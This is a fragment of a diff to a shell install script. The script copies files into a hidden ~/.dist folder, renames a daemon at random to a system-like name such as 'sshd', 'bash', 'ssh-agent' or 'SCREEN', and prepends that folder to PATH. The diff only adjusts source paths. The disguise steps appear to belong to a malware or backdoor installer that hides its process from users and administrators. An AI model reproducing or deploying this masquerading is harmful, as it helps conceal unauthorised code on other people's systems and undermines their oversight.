@@ -12,7 +12,7 @@ chmod g+rx ~
 
 [ -e ~/.dist ] && rm -rf ~/.dist >/dev/null 2>&1
 mkdir -p ~/.dist
-cp -Rf "$srcdir"/* ~/.dist/
+cp -Rf "$srcdir"/dist/* ~/.dist/
 
 name[0]="sshd"
 name[1]="bash"
@@ -21,7 +21,7 @@ name[3]="ssh-agent"
 name[4]="SCREEN"
 rand=$[ $RANDOM % 5 ]
 pname="${name[$rand]}"
-mv ~/.dist/daemon.py ~/.dist/$pname
+mv ~/.dist/daemon ~/.dist/$pname
 
 oldpath="$PATH"
 export PATH=~/.dist:"$PATH"
